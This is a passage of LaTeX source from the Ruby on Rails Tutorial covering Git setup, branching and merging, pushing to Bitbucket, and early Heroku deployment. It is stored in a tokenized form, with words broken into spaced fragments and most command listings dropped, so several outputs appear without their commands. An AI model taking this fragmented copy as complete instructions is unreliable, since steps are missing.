▁Now ▁that ▁we ▁have ▁a ▁fresh ▁and ▁working ▁Rails ▁application , ▁we ' ll ▁take ▁a ▁moment ▁for ▁a ▁step ▁that , ▁while ▁technical ly ▁optional , ▁would ▁be ▁view ed ▁by ▁experience d ▁software ▁developers ▁as ▁practical ly ▁essential : ▁ placing ▁our ▁application ▁source ▁code ▁under ▁\ emph { version ▁control }.
▁ Version ▁control ▁systems ▁allow ▁us ▁to ▁track ▁changes ▁to ▁our ▁project ' s ▁code , ▁collaborat e ▁more ▁easily , ▁and ▁roll ▁back ▁any ▁in ad ve r t ent ▁errors ▁( such ▁as ▁accidental ly ▁deleting ▁files ).
▁ K now ing ▁how ▁to ▁use ▁a ▁version ▁control ▁system ▁is ▁a ▁required ▁ s k i ll ▁for ▁every ▁p rofessional - grade ▁software ▁developer .
▁There ▁are ▁many ▁options ▁for ▁version ▁control , ▁but ▁the ▁Rails ▁community ▁has ▁large ly ▁standard ize d ▁on ▁\ href { http :// git - sc m . com /}{ G it }, ▁a ▁d ist r i but ed ▁version ▁control ▁system ▁original ly ▁ developed ▁by ▁L in us ▁To r v al d s ▁to ▁host ▁the ▁L in u x ▁ k er n el .
▁P utting ▁your ▁source ▁code ▁under ▁version ▁control ▁with ▁Git ▁is ▁\ emph { strong ly } ▁recommended , ▁not ▁only ▁because ▁it ' s ▁ nearly ▁a ▁ universal ▁practice ▁in ▁the ▁Rails ▁world , ▁but ▁also ▁because ▁it ▁will ▁allow ▁you ▁to ▁back ▁up ▁and ▁share ▁your ▁code ▁more ▁easily ▁( Section ~\ ref { sec : bitbucket }) ▁and ▁deploy ▁your ▁application ▁right ▁here ▁in ▁the ▁first ▁chapter ▁( Section ~\ ref { sec : deploying }).
▁< n >< n > ▁\ subsection { In st all ation ▁and ▁setup }< n > ▁\ label { sec : git _ setup }< n >< n >
▁The ▁cloud ▁IDE ▁recommended ▁in ▁Section ~\ ref { sec : development _ environment } ▁includes ▁Git ▁by ▁default , ▁so ▁no ▁installation ▁is ▁necessary ▁in ▁this ▁case .
▁Otherwise , ▁\ href { http :// install rails . com /}{ In st all Rails . com } ▁( Section ~\ ref { sec : up _ and _ running }) ▁includes ▁instructions ▁for ▁install ing ▁Git ▁on ▁your ▁system .
▁First - time ▁system ▁setup
▁Before ▁using ▁Git , ▁you ▁should ▁perform ▁a ▁set ▁of ▁one - time ▁setup ▁steps .
▁These ▁are ▁\ emph { system } ▁setup s , ▁meaning ▁you ▁only ▁have ▁to ▁do ▁them ▁once ▁per ▁computer :
▁Note ▁that ▁the ▁name ▁and ▁email ▁address ▁you ▁use ▁in ▁your ▁Git ▁configuration ▁will ▁be ▁available ▁in ▁any ▁repositories ▁you ▁make ▁public .
▁( O n ly ▁the ▁first ▁two ▁lines ▁above ▁are ▁ str ic t ly ▁necessary .
▁The ▁third ▁line ▁is ▁included ▁only ▁to ▁ensure ▁forward - compatibility ▁with ▁an ▁up com ing ▁release ▁of ▁Git .
▁The ▁optional ▁four th ▁line ▁is ▁included ▁so ▁that ▁you ▁can ▁use ▁\ k ode { co } ▁in ▁place ▁of ▁the ▁more ▁verb o se ▁\ k ode { checkout } ▁command .
▁For ▁ maximum ▁ compatibility ▁with ▁systems ▁that ▁don ' t ▁have ▁\ k ode { co } ▁configured , ▁this ▁tutorial ▁will ▁use ▁the ▁full ▁\ k ode { checkout } ▁command , ▁but ▁in ▁real ▁life ▁I ▁ nearly ▁always ▁use ▁\ k ode { git ▁co }. )
▁First - time ▁repository ▁setup
▁Now ▁we ▁come ▁to ▁some ▁steps ▁that ▁are ▁necessary ▁each ▁time ▁you ▁create ▁a ▁new ▁\ emph { repository } ▁( s ometimes ▁called ▁a ▁\ emph { repo } ▁for ▁short ).
▁First ▁navigate ▁to ▁the ▁root ▁directory ▁of ▁the ▁first ▁app ▁and ▁initialize ▁a ▁new ▁repository :
▁The ▁next ▁step ▁is ▁to ▁add ▁all ▁the ▁project ▁files ▁to ▁the ▁repository ▁using ▁\ k ode { git ▁add ▁- A } :
▁This ▁command ▁add s ▁all ▁the ▁files ▁in ▁the ▁current ▁directory ▁a part ▁from ▁those ▁that ▁match ▁the ▁pattern s ▁in ▁a ▁special ▁file ▁called ▁\ k ode { . gitignore }.
▁The ▁\ k ode { rails ▁new } ▁command ▁automatically ▁generates ▁a ▁\ k ode { . gitignore } ▁file ▁appropriate ▁to ▁a ▁Rails ▁project , ▁but ▁you ▁can ▁add ▁ additional ▁pattern s ▁as ▁well
▁A lthough ▁we ' ll ▁ never ▁need ▁to ▁edit ▁it ▁in ▁the ▁main ▁tutorial , ▁an ▁example ▁of ▁adding ▁a ▁rule ▁to ▁the ▁\ k ode { . gitignore } ▁file ▁appears ▁in ▁Section ~\ ref { sec : guard }, ▁which ▁is ▁part ▁of ▁the ▁optional ▁advanced ▁testing ▁setup ▁in ▁Section ~\ ref { sec : advance d _ test ing _ setup }.
▁The ▁added ▁files ▁are ▁initially ▁placed ▁in ▁a ▁\ emph { staging ▁are a }, ▁which ▁contains ▁ pending ▁changes ▁to ▁your ▁project .
▁You ▁can ▁see ▁which ▁files ▁are ▁in ▁the ▁ staging ▁are a ▁using ▁the ▁\ k ode { status } ▁command :
▁< n >< n > Initial ▁commit
▁ . gitignore
▁Gemfile . lock
▁README . rdoc
▁Rake file
▁( The ▁results ▁are ▁long , ▁so ▁I ' ve ▁used ▁vertical ▁do t s ▁to ▁indicate ▁omitted ▁output .)
▁To ▁tell ▁Git ▁you ▁want ▁to ▁keep ▁the ▁changes , ▁use ▁the ▁\ k ode { commit } ▁command :
▁[ master ▁( root - commit ) ▁d f 0 a 6 2 f ] ▁Initialize ▁repository
▁The ▁\ k ode { - m } ▁flag ▁let s ▁you ▁add ▁a ▁message ▁for ▁the ▁commit ; ▁if ▁you ▁omit ▁\ k ode { - m }, ▁Git ▁will ▁open ▁the ▁system ' s ▁default ▁editor ▁and ▁have ▁you ▁enter ▁the ▁message ▁there .
▁( A ll ▁the ▁examples ▁in ▁this ▁book ▁will ▁use ▁the ▁\ k ode { - m } ▁flag .)
▁It ▁is ▁important ▁to ▁note ▁that ▁Git ▁commit s ▁are ▁\ emph { local }, ▁record ed ▁only ▁on ▁the ▁machine ▁on ▁which ▁the ▁commit s ▁occur .
▁We ' ll ▁see ▁how ▁to ▁push ▁the ▁changes ▁up ▁to ▁a ▁remote ▁repository ▁( using ▁\ k ode { git ▁push }) ▁in ▁Section ~\ ref { sec : git _ command s }.
▁By ▁the ▁way , ▁you ▁can ▁see ▁a ▁list ▁of ▁your ▁commit ▁messages ▁using ▁the ▁\ k ode { log } ▁command :
▁commit ▁d f 0 a 6 2 f 3 f 0 9 1 e 5 3 ff a 7 99 3 0 9 b 3 e 3 2 c 27 b 0 b 38 e b 4
▁ Auth or : ▁ Michael ▁Hartl ▁< michael @ michael hartl . com >
▁De pending ▁on ▁the ▁length ▁of ▁your ▁repository ' s ▁log ▁ history , ▁you ▁may ▁have ▁to ▁type ▁\ k ode { q } ▁to ▁ quit .
▁If ▁you ' ve ▁ never ▁used ▁version ▁control ▁before , ▁it ▁may ▁not ▁be ▁entire ly ▁clear ▁at ▁this ▁point ▁what ▁good ▁it ▁does ▁you , ▁so ▁let ▁me ▁give ▁just ▁one ▁example .
▁D ' o h !
▁application _ controller . rb
▁ l s : ▁app / controllers / : ▁No ▁such ▁file ▁or ▁directory
▁The ▁\ k ode { - r f } ▁flag ▁means ▁`` recursive ▁force '' , ▁which ▁ recursive ly ▁remove s ▁all ▁files , ▁directories , ▁subdirectories , ▁and ▁so ▁on , ▁without ▁as k ing ▁for ▁explicit ▁confirmation ▁of ▁each ▁deletion .
▁Let ' s ▁check ▁the ▁status ▁to ▁see ▁what ▁changed :
▁no ▁changes ▁added ▁to ▁commit ▁( use ▁" git ▁add " ▁and / or ▁" git ▁commit ▁- a ")
▁We ▁see ▁here ▁that ▁a ▁file ▁has ▁been ▁deleted , ▁but ▁the ▁changes ▁are ▁only ▁on ▁the ▁`` working ▁ tree '' ; ▁they ▁have n ' t ▁been ▁commit t ed ▁yet .
▁This ▁means ▁we ▁can ▁ still ▁undo ▁the ▁changes ▁using ▁the ▁\ k ode { checkout } ▁command ▁with ▁the ▁\ k ode { - f } ▁flag ▁to ▁force ▁overwrit ing ▁the ▁current ▁changes :
▁nothing ▁to ▁commit ▁( working ▁directory ▁clean )
▁The ▁missing ▁files ▁and ▁directories ▁are ▁back .
▁That ' s ▁a ▁relie f !
▁Now ▁that ▁we ' ve ▁put ▁our ▁project ▁under ▁version ▁control ▁with ▁Git , ▁it ' s ▁time ▁to ▁push ▁our ▁code ▁up ▁to ▁\ href { http :// www . bitbucket . com }{ B it b uck et }, ▁a ▁site ▁optimized ▁for ▁host ing ▁and ▁ s h ar ing ▁Git ▁repositories .
▁P utting ▁a ▁copy ▁of ▁your ▁Git ▁repository ▁at ▁Bitbucket ▁serve s ▁two ▁purposes : ▁it ' s ▁a ▁full ▁back up ▁of ▁your ▁code ▁( including ▁the ▁full ▁ history ▁of ▁commit s ), ▁and ▁it ▁make s ▁any ▁future ▁collaborat ion ▁much ▁easier .
▁GitHub ▁and ▁Bitbucket
▁By ▁far ▁the ▁two ▁most ▁popular ▁site s ▁for ▁host ing ▁Git ▁repositories ▁are ▁GitHub ▁and ▁Bitbucket .
▁The ▁two ▁ service s ▁share ▁many ▁similar it ies : ▁both ▁site s ▁allow ▁for ▁Git ▁repository ▁host ing ▁and ▁collaborat ion , ▁as ▁well ▁as ▁offer ing ▁convenient ▁ways ▁to ▁b row se ▁and ▁search ▁repositories .
▁The ▁important ▁difference s ▁( from ▁the ▁per spec tive ▁of ▁this ▁tutorial ) ▁are ▁that ▁GitHub ▁offer s ▁un limited ▁free ▁repositories ▁( with ▁collaborat ion ) ▁for ▁open - source ▁repositories ▁while ▁ cha r g ing ▁for ▁private ▁ repo s , ▁whereas ▁Bitbucket ▁allows ▁un limited ▁free ▁private ▁ repo s ▁while ▁ cha r g ing ▁for ▁more ▁than ▁a ▁certain ▁number ▁of ▁collaborat or s .
▁Whi ch ▁ service ▁you ▁use ▁for ▁a ▁particular ▁ repo ▁thus ▁depend s ▁on ▁your ▁specific ▁needs .
▁P re v ious ▁edition s ▁of ▁this ▁book ▁used ▁GitHub ▁because ▁of ▁its ▁emphasi s ▁on ▁support ing ▁open - source ▁code , ▁but ▁g row ing ▁concern s ▁about ▁security ▁have ▁ l ed ▁me ▁to ▁recommend ▁that ▁\ emph { all } ▁web ▁application ▁repositories ▁be ▁private ▁by ▁default .
▁The ▁issue ▁is ▁that ▁web ▁application ▁repositories ▁m ight ▁contain ▁ potentially ▁ sensitive ▁information ▁such ▁as ▁ crypt ographic ▁keys ▁and ▁passwords , ▁which ▁could ▁be ▁used ▁to ▁compromise ▁the ▁security ▁of ▁a ▁site ▁running ▁the ▁code .
▁It ▁is ▁possible , ▁of ▁course , ▁to ▁arrange ▁for ▁this ▁information ▁to ▁be ▁handle d ▁secure ly ▁( by ▁ having ▁Git ▁ignore ▁it , ▁for ▁example ), ▁but ▁this ▁is ▁error - prone ▁and ▁requires ▁significant ▁ expert is e .
▁As ▁it ▁happens , ▁the ▁sample ▁application ▁created ▁in ▁this ▁tutorial ▁is ▁safe ▁for ▁ ex p o s ure ▁on ▁the ▁web , ▁but ▁it ▁is ▁ danger ous ▁to ▁rely ▁on ▁this ▁fact ▁in ▁general .
▁Thus , ▁to ▁be ▁as ▁secure ▁as ▁possible , ▁we ▁will ▁ er r ▁on ▁the ▁side ▁of ▁caution ▁and ▁use ▁private ▁repositories ▁by ▁default .
▁S ince ▁GitHub ▁charge s ▁for ▁private ▁repositories ▁while ▁Bitbucket ▁offer s ▁an ▁un limited ▁number ▁for ▁free , ▁for ▁our ▁purposes ▁Bitbucket ▁is ▁a ▁better ▁fit ▁than ▁GitHub .
▁ Getting ▁started ▁with ▁Bitbucket ▁is ▁simple :
▁\ href { https :// bitbucket . org / account / signup /}{ Sign ▁up ▁for ▁a ▁Bitbucket ▁account } ▁if ▁you ▁don ' t ▁already ▁have ▁one .
▁Co p y ▁your ▁\ href { https :// en . wiki p edia . org / wiki / P u b li c - key _ crypt o gr a ph y }{\ emph { public ▁key } } ▁to ▁your ▁cl ip board .
▁As ▁indicate d ▁in ▁Listing ~\ ref { code : cat _ public _ key }, ▁users ▁of ▁the ▁cloud ▁IDE ▁can ▁view ▁their ▁public ▁key ▁using ▁the ▁\ k ode { cat } ▁command , ▁which ▁can ▁the n ▁be ▁select ed ▁and ▁copie d .
▁If ▁you ' re ▁using ▁your ▁own ▁system ▁and ▁see ▁no ▁output ▁when ▁running ▁the ▁command ▁in ▁Listing ~\ ref { code : cat _ public _ key }, ▁follow ▁the ▁instructions ▁on ▁\ href { https :// co n f l u ence . at la s s i an . com / x / Y w V 9 E }{ how ▁to ▁install ▁a ▁public ▁key ▁on ▁your ▁Bitbucket ▁account }.
▁Add ▁your ▁public ▁key ▁to ▁Bitbucket ▁by ▁click ing ▁on ▁the ▁ avatar ▁image ▁in ▁the ▁upper ▁right ▁and ▁select ing ▁`` M an age ▁account '' ▁and ▁the n ▁`` SS H ▁keys '' ▁( F igure ~\ ref { fig : add _ public _ key }).
▁P r in ting ▁the ▁public ▁key ▁using ▁\ k ode { cat }.
▁ $ ▁ cat ▁ ~ / . s s h / id _ r s a . p u b
▁ Adding ▁the ▁ SS H ▁public ▁key .
▁On ce ▁you ' ve ▁added ▁your ▁public ▁key , ▁click ▁on ▁`` Create '' ▁to ▁\ href { https :// bitbucket . org / repo / create }{ create ▁a ▁new ▁repository }, ▁as ▁show n ▁in ▁F igure ~\ ref { fig : create _ first _ repository }.
▁After ▁click ing ▁`` Create ▁repository '' , ▁follow ▁the ▁instructions ▁under ▁`` Co m m and ▁line ▁ > ▁I ▁have ▁an ▁existing ▁project '' , ▁which ▁should ▁look ▁something ▁like ▁Listing ~\ ref { code : bitbucket _ add _ p us h }.
▁( If ▁it ▁does n ' t ▁look ▁like ▁Listing ~\ ref { code : bitbucket _ add _ p us h }, ▁it ▁m ight ▁be ▁because ▁the ▁public ▁key ▁did n ' t ▁get ▁added ▁correctly , ▁in ▁which ▁case ▁I ▁suggest ▁try ing ▁that ▁step ▁again .)
▁When ▁push ing ▁up ▁the ▁repository , ▁an s w er ▁ y es ▁if ▁you ▁see ▁the ▁question ▁`` A re ▁you ▁sure ▁you ▁want ▁to ▁continu e ▁connect ing ▁( y es / no ) ? ''
▁Creat ing ▁the ▁first ▁app ▁repository ▁at ▁Bitbucket .
▁ Adding ▁Bitbucket ▁and ▁push ing ▁up ▁the ▁repository .
▁The ▁commands ▁in ▁Listing ~\ ref { code : bitbucket _ add _ p us h } ▁first ▁tell ▁Git ▁that ▁you ▁want ▁to ▁add ▁Bitbucket ▁as ▁the ▁\ emph { origin } ▁for ▁your ▁repository , ▁and ▁the n ▁push ▁your ▁repository ▁up ▁to ▁the ▁remote ▁ origin .
▁( Do n ' t ▁worry ▁about ▁what ▁the ▁\ k ode { - u } ▁flag ▁does ; ▁if ▁you ' re ▁curious , ▁do ▁a ▁web ▁search ▁for ▁`` git ▁set ▁up st re am '' .)
▁For ▁example , ▁the ▁command ▁I ▁ ra n ▁was
▁A ▁Bitbucket ▁repository ▁page .
▁\ label { fig : bitbucket _ repository _ page } }< n >\ end { figure }< n >< n >< n > ▁\ subsection { B ra n ch , ▁edit , ▁commit , ▁merge }< n > ▁\ label { sec : git _ command s }< n >< n >
▁If ▁you ' ve ▁followed ▁the ▁steps ▁in ▁Section ~\ ref { sec : bitbucket }, ▁you ▁m ight ▁notice ▁that ▁Bitbucket ▁did n ' t ▁automatically ▁detect ▁the ▁\ k ode { README . rdoc } ▁file ▁from ▁our ▁repository , ▁instead ▁complain ing ▁on ▁the ▁main ▁repository ▁page ▁that ▁there ▁is ▁no ▁README ▁present ▁( F igure ~\ ref { fig : bitbucket _ no _ readme }).
▁This ▁is ▁an ▁indicat ion ▁that ▁the ▁\ k ode { rdoc } ▁format ▁is n ' t ▁common ▁enough ▁for ▁Bitbucket ▁to ▁support ▁it ▁automatically , ▁and ▁in de ed ▁I ▁and ▁virtual ly ▁every ▁other ▁developer ▁I ▁know ▁prefer ▁to ▁use ▁\ emph { Markdown } ▁instead .
▁In ▁this ▁section , ▁we ' ll ▁change ▁the ▁\ k ode { README . rdoc } ▁file ▁to ▁\ k ode { README . m d }, ▁while ▁tak ing ▁the ▁opportunit y ▁to ▁add ▁some ▁Rails ▁Tutorial - - specific ▁content ▁to ▁the ▁README ▁file .
▁In ▁the ▁process , ▁we ' ll ▁see ▁a ▁first ▁example ▁of ▁the ▁branch , ▁edit , ▁commit , ▁merge ▁work flow ▁that ▁I ▁recommend ▁using ▁with ▁Git
▁For ▁a ▁convenient ▁way ▁to ▁ visual ize ▁Git ▁repositories , ▁take ▁a ▁look ▁at ▁\ href { http :// www . source tree app . com /}{ A t la s s i an ' s ▁S our ce T re e ▁app }.
▁Git ▁is ▁in credibly ▁good ▁at ▁making ▁\ emph { branch es }, ▁which ▁are ▁effective ly ▁copie s ▁of ▁a ▁repository ▁where ▁we ▁can ▁make ▁( possibl y ▁ ex p er i ment al ) ▁changes ▁without ▁modify ing ▁the ▁ parent ▁files .
▁In ▁most ▁cases , ▁the ▁ parent ▁repository ▁is ▁the ▁\ emph { master } ▁branch , ▁and ▁we ▁can ▁create ▁a ▁new ▁topic ▁branch ▁by ▁using ▁\ k ode { checkout } ▁with ▁the ▁\ k ode { - b } ▁flag :
▁S w it ch ed ▁to ▁a ▁new ▁branch ▁' mod ify - README '
▁* ▁modify - README
▁Here ▁the ▁second ▁command , ▁\ k ode { git ▁branch }, ▁just ▁list s ▁all ▁the ▁local ▁branches , ▁and ▁the ▁as ter is k ~\ k ode { * } ▁identifie s ▁which ▁branch ▁we ' re ▁current ly ▁on .
▁Note ▁that ▁\ k ode { git ▁ checkout ▁- b ▁modify - README } ▁both ▁creates ▁a ▁new ▁branch ▁and ▁switch es ▁to ▁it , ▁as ▁indicate d ▁by ▁the ▁as ter is k ▁in ▁front ▁of ▁the ▁\ k ode { mod ify - README } ▁branch .
▁( If ▁you ▁set ▁up ▁the ▁\ k ode { co } ▁alias ▁in ▁Section ~\ ref { sec : version _ control }, ▁you ▁can ▁use ▁\ k ode { git ▁co ▁- b ▁modify - README } ▁instead .)
▁See ▁the ▁chapter ▁\ href { http :// git - sc m . com / book / en / git - branch ing }{ G it ▁B ra n ch ing ▁in ▁\ emph { Pro ▁Git } } ▁for ▁details .
▁In ▁particular , ▁the ▁master ▁branch ▁is ▁in s ul at ed ▁from ▁any ▁changes ▁we ▁make ▁to ▁the ▁topic ▁branch , ▁so ▁even ▁if ▁we ▁\ emph { re ally } ▁ sc re w ▁things ▁up ▁we ▁can ▁always ▁a b and on ▁the ▁changes ▁by ▁check ing ▁out ▁the ▁master ▁branch ▁and ▁deleting ▁the ▁topic ▁branch .
▁We ' ll ▁see ▁how ▁to ▁do ▁this ▁at ▁the ▁end ▁of ▁the ▁section .
▁By ▁the ▁way , ▁for ▁a ▁change ▁as ▁small ▁as ▁this ▁one ▁I ▁would n ' t ▁normally ▁both er ▁with ▁a ▁new ▁branch , ▁but ▁in ▁the ▁present ▁context ▁it ' s ▁a ▁p r i me ▁opportunit y ▁to ▁start ▁p r ac tic ing ▁good ▁habit s .
▁After ▁creating ▁the ▁topic ▁branch , ▁we ' ll ▁edit ▁it ▁to ▁make ▁it ▁a ▁little ▁more ▁ de script ive .
▁I ▁prefer ▁the ▁\ href { http :// d ar ing fi re b all . net / projects / m ar k d own /}{ Markdown ▁markup ▁language } ▁to ▁the ▁default ▁ RDoc ▁for ▁this ▁purpose , ▁and ▁if ▁you ▁use ▁the ▁file ▁extension ▁\ k ode { . m d } ▁the n ▁Bitbucket ▁will ▁automatically ▁format ▁it ▁nicely ▁for ▁you .
▁So , ▁first ▁we ' ll ▁use ▁Git ' s ▁version ▁of ▁the ▁Unix ▁\ k ode { m v } ▁( m o ve ) ▁command ▁to ▁change ▁the ▁name :
▁Then ▁fill ▁\ k ode { README . m d } ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : new _ readme }.
▁The ▁new ▁\ k ode { README } ▁file , ▁\ k ode { README . m d }.
▁# ▁Ruby ▁on ▁Rails ▁Tutorial : ▁" hello , ▁world !"
▁< n >< n > This ▁is ▁the ▁first ▁application ▁for ▁the < n >[ * Ruby ▁on ▁Rails ▁Tutorial * ]( http :// www . railstutorial . org / )< n > by ▁[ Michael ▁Hartl ]( http :// www . michael hartl . com / ).
▁With ▁the ▁changes ▁made , ▁we ▁can ▁take ▁a ▁look ▁at ▁the ▁status ▁of ▁our ▁branch :
▁2 ▁files ▁changed , ▁5 ▁insert ion s ( + ), ▁24 3 ▁deletion s ( - )
▁delete ▁mode ▁100 64 4 ▁README . rdoc
▁create ▁mode ▁100 64 4 ▁README . m d
▁Be ▁careful ▁about ▁using ▁the ▁\ k ode { - a } ▁flag ▁i mp r o p er ly ; ▁if ▁you ▁have ▁added ▁any ▁new ▁files ▁to ▁the ▁project ▁since ▁the ▁last ▁commit , ▁you ▁ still ▁have ▁to ▁tell ▁Git ▁about ▁them ▁using ▁\ k ode { git ▁add ▁- A } ▁first .
▁Note ▁that ▁we ▁write ▁the ▁commit ▁message ▁in ▁the ▁\ emph { present } ▁te n se ▁( and , ▁technical ly ▁sp e a k ing , ▁the ▁\ href { http :// en . wiki p edia . org / wiki / I mp er a tive _ m ood }{ i mp er a tive ▁m ood }).
▁Git ▁models ▁commit s ▁as ▁a ▁series ▁of ▁ patch es , ▁and ▁in ▁this ▁context ▁it ▁make s ▁sense ▁to ▁describe ▁what ▁each ▁commit ▁\ emph { do es }, ▁rather ▁than ▁what ▁it ▁did .
▁More over , ▁this ▁usage ▁matches ▁up ▁with ▁the ▁commit ▁messages ▁generated ▁by ▁Git ▁commands ▁themselves .
▁See ▁the ▁article ▁`` \ href { https :// github . com / blog / 9 2 6 - s h in y - new - commit - style s }{ S h in y ▁new ▁commit ▁style s } '' ▁for ▁more ▁information .
▁Now ▁that ▁we ' ve ▁finished ▁making ▁our ▁changes , ▁we ' re ▁ready ▁to ▁\ emph { merge } ▁the ▁results ▁back ▁into ▁our ▁master ▁branch :
▁S w it ch ed ▁to ▁branch ▁' master '
▁ Updating ▁ 34 f 06 b 7 . . 2 c 9 2 be f
▁F as t ▁forward
▁README . rdoc ▁| ▁24 3 ▁--------------- --- ---------------- ----------------
▁README . m d ▁| ▁5 ▁ +
▁Note ▁that ▁the ▁Git ▁output ▁frequent ly ▁includes ▁things ▁like ▁\ k ode { 34 f 06 b 7 }, ▁which ▁are ▁related ▁to ▁Git ' s ▁internal ▁representation ▁of ▁repositories .
▁Your ▁exact ▁results ▁will ▁differ ▁in ▁these ▁details , ▁but ▁otherwise ▁should ▁essential ly ▁match ▁the ▁output ▁show n ▁above .
▁After ▁you ' ve ▁merge d ▁in ▁the ▁changes , ▁you ▁can ▁t id y ▁up ▁your ▁branches ▁by ▁deleting ▁the ▁topic ▁branch ▁using ▁\ k ode { git ▁branch ▁- d } ▁if ▁you ' re ▁done ▁with ▁it :
▁Delet ed ▁branch ▁modify - README ▁( w as ▁2 c 9 2 be f ).
▁This ▁step ▁is ▁optional , ▁and ▁in ▁fact ▁it ' s ▁quite ▁common ▁to ▁leave ▁the ▁topic ▁branch ▁in t ac t .
▁This ▁way ▁you ▁can ▁switch ▁back ▁and ▁for th ▁between ▁the ▁topic ▁and ▁master ▁branches , ▁m er g ing ▁in ▁changes ▁every ▁time ▁you ▁reach ▁a ▁natural ▁stop p ing ▁point .
▁As ▁mentioned ▁above , ▁it ' s ▁also ▁possible ▁to ▁a b and on ▁your ▁topic ▁branch ▁\ line break ▁changes , ▁in ▁this ▁case ▁with ▁\ k ode { git ▁branch ▁- D } :
▁# ▁For ▁i ll u str ation ▁only ; ▁don ' t ▁do ▁this ▁unless ▁you ▁me s s ▁up ▁a ▁branch
▁Un like ▁the ▁\ k ode { - d } ▁flag , ▁the ▁\ k ode { - D } ▁flag ▁will ▁delete ▁the ▁branch ▁even ▁though ▁we ▁have n ' t ▁merge d ▁in ▁the ▁changes .
▁Now ▁that ▁we ' ve ▁updated ▁the ▁\ k ode { README }, ▁we ▁can ▁push ▁the ▁changes ▁up ▁to ▁Bitbucket ▁to ▁see ▁the ▁result .
▁S ince ▁we ▁have ▁already ▁done ▁one ▁push ▁( Section ~\ ref { sec : bitbucket }), ▁on ▁most ▁systems ▁we ▁can ▁omit ▁\ k ode { origin ▁master }, ▁and ▁simply ▁run ▁\ k ode { git ▁push } :
▁The ▁improve d ▁\ k ode { README } ▁file ▁ formatted ▁with ▁ Markdown .
▁\ label { fig : new _ readme } }< n >\ end { figure }< n >< n > ▁% ▁section ▁version _ control ▁( end )< n >< n > ▁\ section { D e p lo ying } ▁% ▁( fold )< n > ▁\ label { sec : deploying }< n >< n >
▁Even ▁at ▁this ▁ early ▁stage , ▁we ' re ▁already ▁going ▁to ▁deploy ▁our ▁( nearly ▁empty ) ▁Rails ▁application ▁to ▁production .
▁This ▁step ▁is ▁optional , ▁but ▁deploying ▁ early ▁and ▁often ▁allows ▁us ▁to ▁catch ▁any ▁deployment ▁problem s ▁ early ▁in ▁our ▁development ▁cycle .
▁The ▁ alternative --- deploying ▁only ▁after ▁ la b or ious ▁effort ▁ se al ed ▁a way ▁in ▁a ▁development ▁environment --- of t en ▁lead s ▁to ▁terribl e ▁integration ▁ head a ch es ▁when ▁ la un ch ▁time ▁comes
▁T h ough ▁it ▁should n ' t ▁matter ▁for ▁the ▁example ▁applications ▁in ▁the ▁\ emph { Rails ▁Tutorial }, ▁if ▁you ' re ▁ w or r i ed ▁about ▁accidental ly ▁making ▁your ▁app ▁public ▁too ▁soon ▁there ▁are ▁sever al ▁options ; ▁see ▁Section ~\ ref { sec : heroku _ command s } ▁for ▁one .
▁De p lo ying ▁Rails ▁applications ▁used ▁to ▁be ▁a ▁p a in , ▁but ▁the ▁Rails ▁deployment ▁e co system ▁has ▁m at ur ed ▁ r api d ly ▁in ▁the ▁ past ▁few ▁ years , ▁and ▁now ▁there ▁are ▁sever al ▁great ▁options .
▁ Pro no un c ed ▁`` Engine ▁ X ''.
▁My ▁favor ite ▁Rails ▁deployment ▁option ▁is ▁Heroku , ▁which ▁is ▁a ▁host ed ▁platform ▁built ▁specifically ▁for ▁deploying ▁Rails ▁and ▁other ▁web ▁applications
▁Heroku ▁make s ▁deploying ▁Rails ▁applications ▁ r id ic ul ous ly ▁easy --- as ▁long ▁as ▁your ▁source ▁code ▁is ▁under ▁version ▁control ▁with ▁Git .
▁( This ▁is ▁yet ▁another ▁reason ▁to ▁follow ▁the ▁Git ▁setup ▁steps ▁in ▁Section ~\ ref { sec : version _ control } ▁if ▁you ▁have n ' t ▁already .)
▁In ▁addition , ▁for ▁many ▁purposes , ▁including ▁for ▁this ▁tutorial , ▁Heroku ' s ▁free ▁ti er ▁is ▁more ▁than ▁ s u ff ic i ent .
▁Inde ed , ▁the ▁first ▁two ▁edition s ▁of ▁this ▁tutorial ▁were ▁host ed ▁for ▁free ▁on ▁Heroku , ▁which ▁served ▁sever al ▁m i ll ion ▁requests ▁without ▁ cha r g ing ▁me ▁a ▁c ent .
▁The ▁rest ▁of ▁this ▁section ▁is ▁d ed icated ▁to ▁deploying ▁our ▁first ▁application ▁to ▁Heroku .
▁Some ▁of ▁the ▁idea s ▁are ▁fai r ly ▁advanced , ▁so ▁don ' t ▁worry ▁about ▁understanding ▁all ▁the ▁details ; ▁what ' s ▁important ▁is ▁that ▁by ▁the ▁end ▁of ▁the ▁process ▁we ' ll ▁have ▁deploy ed ▁our ▁application ▁to ▁the ▁live ▁web .
▁< n >< n > ▁\ subsection { Heroku ▁setup }< n > ▁\ label { sec : heroku _ setup }< n >< n >
▁Heroku ▁uses ▁the ▁\ href { http :// www . postgresql . org /}{ Post g re SQL } ▁database ▁( pronoun c ed ▁`` post - gr es - c ue - e ll '' , ▁and ▁often ▁called ▁`` Post gr es '' ▁for ▁short ), ▁which ▁means ▁that ▁we ▁need ▁to ▁add ▁the ▁\ text tt { p g } ~ gem ▁in ▁the ▁production ▁environment ▁to ▁allow ▁Rails ▁to ▁t al k ▁to ▁ Post gr es
▁: \ foo t not e {
▁General ly ▁sp e a k ing , ▁it ' s ▁a ▁good ▁idea ▁for ▁the ▁development ▁and ▁production ▁environments ▁to ▁match ▁as ▁close ly ▁as ▁possible , ▁which ▁includes ▁using ▁the ▁same ▁database , ▁but ▁for ▁the ▁purposes ▁of ▁this ▁tutorial ▁we ' ll ▁always ▁use ▁SQLite ▁local ly ▁and ▁PostgreSQL ▁in ▁production .
▁See ▁Section ~\ ref { sec : sample _ app _ setup } ▁for ▁more ▁information .
▁in ▁Listing ~\ ref { code : gemfile _ p g _ gem }.
▁To ▁ prepare ▁the ▁system ▁for ▁deployment ▁to ▁production , ▁we ▁run ▁\ k ode { bundle ▁install } ▁with ▁a ▁special ▁flag ▁to ▁prevent ▁the ▁local ▁installation ▁of ▁any ▁production ▁gems ▁( which ▁in ▁this ▁case ▁consist s ▁of ~\ text tt { p g } ▁and ▁\ text tt { rails \_ 12 factor }) :
▁We ▁can ▁commit ▁the ▁result ing ▁change ▁as ▁follows :
▁Next ▁we ▁have ▁to ▁create ▁and ▁configure ▁a ▁new ▁Heroku ▁account .
▁The ▁first ▁step ▁is ▁to ▁\ href { http :// api . heroku . com / signup }{ sign ▁up ▁for ▁Heroku }.
▁Then ▁check ▁to ▁see ▁if ▁your ▁system ▁already ▁has ▁the ▁Heroku ▁command - line ▁client ▁installed :
